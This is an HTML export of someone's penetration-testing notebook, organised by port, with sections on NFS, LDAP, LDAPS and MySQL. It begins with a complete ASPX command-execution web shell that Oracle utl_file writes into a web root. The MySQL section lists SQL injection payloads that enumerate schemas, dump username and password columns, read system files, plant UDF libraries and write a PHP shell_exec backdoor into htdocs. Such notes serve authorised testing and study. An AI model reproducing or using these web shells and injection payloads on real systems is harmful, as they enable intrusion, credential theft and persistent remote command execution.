   Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import
   Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot;
   runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs
   e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new
   ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments =
   &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute =
   false;Process p = Process.Start(psi);StreamReader stmrdr =
   p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void
   cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body
   &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot;
   runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot;
   runat=&quot;server&quot;
   Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button
   id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot;
   OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label
   id=&quot;lblText&quot;
   runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';<br>
      begin<br>
      f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');<br>
      utl_file.put_line(f,s);<br>
      utl_file.fclose(f);<br>
      end;</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:9.509in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:3.3597in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>2049 TCP /
mountd (NFS)</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.175in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Tuesday,
July 13, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>1:08
PM</p>

</div>

<div style='direction:ltr;margin-top:.184in;margin-left:0in;width:9.509in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sudo apt install
nfs-common</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.918in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show paths that
  can be mounted and who can mount them</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.4277in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>showmount -e
  &lt;ip address&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.8986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show client IP's
  using the mount</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.4472in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>showmount -a &lt;
  ip address&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.8986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mount an NFS path</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.5159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mount -t nfs
  &lt;ip<span style='mso-spacerun:yes'>  </span>address&gt;:&lt;nf
  share&gt;<span style='mso-spacerun:yes'>  </span>&lt;local directory t
o mount
  to - Example: /mnt/&gt;</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.5611in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.5611in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3000 TCP /
Express.js Node</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.4993in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Wednesday,
June 23, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>11:05
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:2.9819in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>hadoop</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Big data storage solution</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Data analytics &amp; Data
       science</span></li>
  </ul>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.6041in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.3937in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3268 TCP /
LDAP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:48
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:7.4777in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>LDAP connection to Global
      Catalog</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>LDAP requests sent to port
      3268 can be used to search for objects in the entire forest.</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Only the attributes marked
      for replication to the global catalog can be returned. </span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>For example, a userâ�

       department could not be returned using port 3268 since this attribute is
       not replicated to the global catalog. </span></li>
  </ul>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.2819in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.5194in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3269 TCP /
LDAPS</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:52
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:3.2819in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LDAP connection to
Global Catalog over SSL.</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:13.6895in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.5in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>3306 TCP /
MySql</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.5263in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Wednesday,
March 31, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>2:19
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:13.6895in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Connect to a mysql database</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>impacket-mssqlclient
      username:password@ip.address</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>mysql --host=127.0.0.1
      --port=13306 --user=&lt;username&gt; -p&lt;password (no space after
      -p)&gt;</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Connect to local port (port
       forwarding in this example) 13306 as &lt;username&gt;</span></li>
  </ul>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>User-Defined Functions (UDF)</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Similar to a custom plugin
      for mysql</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Allows administrators to
      create custom repeatable functions to accomplish specific objectives</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Written in C or C++ and will
      run almost any code including system commands</span></li>
 </ul>
</ul>

<p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show variables</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>show variables;</p>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Possibly interesting
       variables</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>hostname</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>tmp directory</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>version</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Architecture
        (version_compile_machine_</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>plugin_dir</span></li>
   </ul>
  </ul>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show user
  privileges</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SHOW grants;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show individual
  variable</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select
  @@&lt;variable – ex. plugin_dir&gt;;</
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show plugins
  directory</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:"Trebuchet MS";font-size:11.0pt'><span
  style='font-style:italic'>show variables like '%plugin_dir%';</span></p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show databases</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>show databases;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show tables</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>show tables;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Use a database</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>use &lt;database
  name&gt;;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show MariaDB
  version</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>@@version</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show the user
  being used to make queries</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>user()</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6555in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Retrieve database
  information like table and column names.<span style='mso-spacerun:yes'>�
  </span>A lot of information about default objects.</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>id=1 union all
  select #(1),of(2),columns(3), table_name from information_schema.tables</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Output all columns
  from a specified table</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>column_name from
  information_schema.columns where table_name='TableName'</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Select username
  and password columns from TableName</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Select username,
  password from TableName</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show all columns
  and records in the users table</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select * from
  users;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show username
  field from the <span style='font-style:italic'>users</span> table and only
  show records with an <span style='font-style:italic'>id</span> of 1.</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT username
  FROM users WHERE id=1;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>INSERT</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>DELETE</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Load data from
  file into a table</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.9597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LOAD DATA LOCAL
  INFILE '/var/www/html/index.php' INTO TABLE &lt;table name&gt; FIELDS
  TERMINATED BY &quot;\n&quot;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Change cell
  contents</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>UPDATE
  &lt;Table&gt; SET &lt;Column&gt;='&lt;Value&gt;' WHERE
  &lt;Column&gt;='&lt;Value&gt;';</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create Database</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create Database
  &lt;Database Name&gt;;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create user</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>create user
  '&lt;username&gt;'@'&lt;host&gt;' IDENTIFIED BY '&lt;password?&gt;';</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Give all
  permissions to user</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>GRANT ALL on
  &lt;database&gt;.* TO '&lt;user&gt;'@'&lt;host&gt;';</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>String
  delimiter.<span style='mso-spacerun:yes'>  </span>Can use to check for
 SQL
  injection vulnerabilities</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>'</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Comment
  marker.<span style='mso-spacerun:yes'>  </span>Removes the statement a
fter it
  from the query.</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>#</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Limit the number
  of records that a query pulls</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LIMIT
  &lt;number&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Set binary
  variable</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>set @&lt;variable
  name&gt; = 0x&lt;binary/hex code&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Output binary
  variable to file</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select binary
  @&lt;binary variable&gt; into dumpfile
  '/home/directory/to/put/file/something.so';</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.6361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Information about
  tables and databases</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:6.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>information_schema.tables</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Command Execution:</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:7.3187in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin-top:5pt;margin-bottom:5pt;font-family:Calibri;font-size:
  11.0pt'>id=1 union all select 1, 2,</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>load_file('C:/Windows/System32/drivers/etc/hosts')</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.4993in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Read file</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:7.3381in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin-top:5pt;margin-bottom:5pt;font-family:Calibri;font-size:
  11.0pt'>id=1 union all select 1, 2, &quot;&lt;?php echo
  shell_exec($_GET['cmd']);?&gt;&quot; into OUTFILE
  'c:/xampp/htdocs/backdoor.php'</p>
  </td>
